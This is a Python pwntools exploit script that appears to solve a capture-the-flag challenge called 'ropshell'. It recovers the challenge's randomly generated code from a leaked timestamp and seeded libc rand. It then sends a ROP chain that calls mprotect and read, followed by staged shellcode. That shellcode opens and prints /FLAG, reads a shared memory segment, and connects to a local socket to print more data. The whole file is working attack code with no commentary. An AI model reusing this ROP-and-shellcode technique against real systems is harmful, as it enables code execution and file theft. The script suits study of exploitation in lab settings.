#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

import ctypes
libc = ctypes.CDLL('libc.so.6')
import struct

context.arch = 'amd64'
context.os = 'linux'

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

timestamp = r.recvuntil(b'Timestamp is ', drop=True)
timestamp = r.recvline(keepends=False).decode()
timestamp = int(timestamp)
print("Timestamp:", timestamp)
code_start = r.recvuntil(b'Random bytes generated at ', drop=True)
code_start = r.recvline(keepends=False).decode()
code_start = int(code_start, 16)
print("code_start:", hex(code_start))

LEN_CODE = 10 * 0x10000
PROT_READ = 0x1               
PROT_WRITE = 0x2              
PROT_EXEC = 0x4 


libc.srand(timestamp)
arr = []
for _ in range(LEN_CODE // 4):
    bs1 = struct.pack('<I', libc.rand())
    bs2 = struct.pack('<I', libc.rand())
    arr.append(bs2[0])
    arr.append(bs2[1])
    arr.append(bs1[0])
    arr.append(bs1[1])
syscall_pos = libc.rand() % (LEN_CODE // 4 - 1)
arr[syscall_pos * 4] = 0x0f
arr[syscall_pos * 4 + 1] = 0x05
arr[syscall_pos * 4 + 2] = 0xc3
arr[syscall_pos * 4 + 3] = 0x00
code = bytes(arr)


shellcode = b''
data = b'/FLAG\x00'
shellcode += data

### Second stage (1)
shellcode += asm('mov QWORD PTR [rbp], rsi')
# sys_open
shellcode += asm('''
    mov rax, 2
    mov rdi, QWORD PTR [rbp]
    mov rsi, 0
    syscall
''')
# sys_read
shellcode += asm('''
    mov r12, rax
    lea r13, [rbp - 8]

    mov rax, 0
    mov rdi, r12
    mov rsi, r13
    mov rdx, 66
    syscall
''')
# sys_write
shellcode += asm('''
    mov rax, 1
    mov rdi, 1
    mov rsi, r13
    mov rdx, 66
    syscall
''')
### Second stage (2)
# sys_shmget
shellcode += asm('''
    mov rax, 29
    mov rdi, 0x1337
    mov rsi, 4096
    mov rdx, 0
    syscall

    mov r12, rax
''')
# sys_shmat
shellcode += asm('''
    mov rax, 30
    mov rdi, r12
    mov rsi, 0
    mov rdx, 4096
    syscall

    mov r12, rax
''')
# sys_write
shellcode += asm('''
    mov rax, 1
    mov rdi, 1
    mov rsi, r12
    mov rdx, 69
    syscall
''')
## Second stage (3)
# sys_connect

# shellcraft.amd64.linux.connect will put socket into rbp
shellcode += asm('''
    mov r12, rbp
    lea r13, [rbp - 8]
''')
shellcode += asm(shellcraft.amd64.linux.connect('127.0.0.1', 0x1337))

# sys_read
shellcode += asm('''
    mov rax, 0
    mov rdi, rbp
    mov rsi, r13
    mov rdx, 67
    syscall
''')

# sys_write
shellcode += asm('''
    mov rax, 1
    mov rdi, 1
    mov rsi, r13
    mov rdx, 67
    syscall
''')

# sys_exit
shellcode += asm('''
    mov rax, 60
    mov rdi, 37
    syscall
''')


### First stage assembly
# sys_mprotect(code_start, LEN_CODE, PROT_READ|PROT_WRITE|PROT_EXEC)
mprotect = [
    code.find(asm('pop rax; ret')) + code_start, 10,
    code.find(asm('pop rdi; ret')) + code_start, code_start, 
    code.find(asm('pop rsi; ret')) + code_start, LEN_CODE,
    code.find(asm('pop rdx; ret')) + code_start, PROT_READ|PROT_WRITE|PROT_EXEC,
    code.find(asm('syscall; ret')) + code_start
]

# sys_read(0, code_start, len(shellcode))
read = [
    code.find(asm('pop rax; ret')) + code_start, 0,
    code.find(asm('pop rdi; ret')) + code_start, 0,
    code.find(asm('pop rsi; ret')) + code_start, code_start,
    code.find(asm('pop rdx; ret')) + code_start, len(shellcode),
    code.find(asm('pop rbp; ret')) + code_start, code_start + len(data) + 0x10000,
    code.find(asm('syscall; ret')) + code_start, code_start + len(data),
]

### First stage send
payload = b''
payload += flat(mprotect)
payload += flat(read)
r.sendafter(b'shell>', payload)

### Second stage send
payload = b''
payload += shellcode
r.sendafter(b'received.', payload)

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :